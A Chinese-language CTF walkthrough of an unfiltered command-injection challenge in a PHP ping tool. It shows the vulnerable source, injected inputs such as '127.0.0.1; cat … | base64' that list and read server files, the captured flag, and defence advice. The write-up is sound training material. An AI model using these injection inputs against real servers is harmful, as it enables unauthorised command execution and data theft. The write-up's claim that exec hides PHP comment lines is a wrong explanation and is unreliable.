# 题目： CTFHub 命令注入 - 无过滤

## 题目描述
打开题目页面，界面是一个 Ping 测试工具。查看后台源码：

```php
<?php
$res = FALSE;
if (isset($_GET['ip']) && $_GET['ip']) {
    $cmd = "ping -c 4 {$_GET['ip']}";
    exec($cmd, $res);
}
?>
```
*分析：*
代码将用户输入的 ip 参数直接拼接到 ping -c 4 命令后。
没有任何过滤机制。
使用 exec() 函数执行，且只将结果的最后部分存入 $res 数组返回。

## 解题思路
### 漏洞原理
在 Linux 命令行中，可以使用 ;、|、& 等符号拼接多条命令。由于前端没有过滤，我们可以直接注入系统命令。

## 解题步骤
1. 测试命令执行
在输入框中输入：
```text
127.0.0.1; ls
```
页面回显了当前目录下的文件列表，发现可疑文件 1781975526131.php。

2. 利用 Base64 强行读取源码
直接 cat 1781975526131.php 由于 PHP 注释的原因没有回显。我们使用 base64 进行编码：
在输入框中输入：
```text
127.0.0.1; cat /var/www/html/1781975526131.php | base64
```
返回结果：
```text
PD9waHAgLy8gY3RmaHViez... (省略)
```

3. 解码获取 Flag
将上面得到的 Base64 字符串放到在线网站解码，得到明文：
```php
<?php 
// ctfhub{da865d9465818ff52c0410d2}
?>
```
提交 flag.

## 踩坑指南
1. 常规 cat 命令读不到内容
原因： 目标文件里的 flag 是 PHP 注释（//），exec 函数执行 cat 时，会忽略注释行。
解决： 使用 cat xxx.php | base64，把内容编码成 Base64 字符串，这样就不会被 exec 过滤。

2. 全盘搜索 find 速度太慢且无效
原因： 系统文件太多，flag 可能藏在特定 PHP 文件里。
解决： 优先查看网站目录 /var/www/html/ 下的文件。

## 知识点总结

| 知识点 | 说明 |
| :--- | :--- |
| 命令注入 | 利用 `;`、`|` 等符号拼接系统命令 |
| `exec()` | 执行外部程序，返回最后一行结果 |
| Base64 绕过 | 将文件内容编码为单行字符串，绕过回显限制 |

### 防御建议
使用白名单：限制 ip 参数只能是合法的 IP 格式。
过滤特殊符号：过滤 ;、|、&、$ 等命令拼接符号。
禁用危险函数：在生产环境中禁用 exec、system 等执行命令的函数。
